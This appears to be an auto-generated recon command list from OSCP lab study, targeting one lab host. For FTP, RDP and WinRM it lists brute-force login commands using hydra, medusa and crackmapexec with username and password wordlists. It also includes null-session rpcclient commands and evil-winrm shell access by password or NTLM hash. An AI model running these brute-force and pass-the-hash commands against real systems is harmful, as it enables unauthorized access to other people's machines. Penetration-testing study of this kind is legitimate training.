```bash
[*] ftp on tcp/21

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/home/kali/study/OSCP/Labs/10.11.1.221/results/10.11.1.221/scans/tcp21/tcp_21_ftp_hydra.txt" ftp://10.11.1.221

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 21 -O "/home/kali/study/OSCP/Labs/10.11.1.221/results/10.11.1.221/scans/tcp21/tcp_21_ftp_medusa.txt" -M ftp -h 10.11.1.221

[*] msrpc on tcp/135

	[-] RPC Client:

		rpcclient -p 135 -U "" 10.11.1.221

[*] ms-wbt-server on tcp/3389

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 3389 -o "/home/kali/study/OSCP/Labs/10.11.1.221/results/10.11.1.221/scans/tcp3389/tcp_3389_rdp_hydra.txt" rdp://10.11.1.221

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 3389 -O "/home/kali/study/OSCP/Labs/10.11.1.221/results/10.11.1.221/scans/tcp3389/tcp_3389_rdp_medusa.txt" -M rdp -h 10.11.1.221

[*] wsman on tcp/5985

	[-] Bruteforce logins:

		crackmapexec winrm 10.11.1.221 -d <domain> -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/seclists/Passwords/darkweb2017-top100.txt

	[-] Check login (requires credentials):

		crackmapexec winrm 10.11.1.221 -d <domain> -u <username> -p <password> -x "whoami"

	[-] Evil WinRM (gem install evil-winrm):

		evil-winrm -u <user> -p <password> -i 10.11.1.221

		evil-winrm -u <user> -H <hash> -i 10.11.1.221

[*] msrpc on tcp/49666

	[-] RPC Client:

		rpcclient -p 49666 -U "" 10.11.1.221


```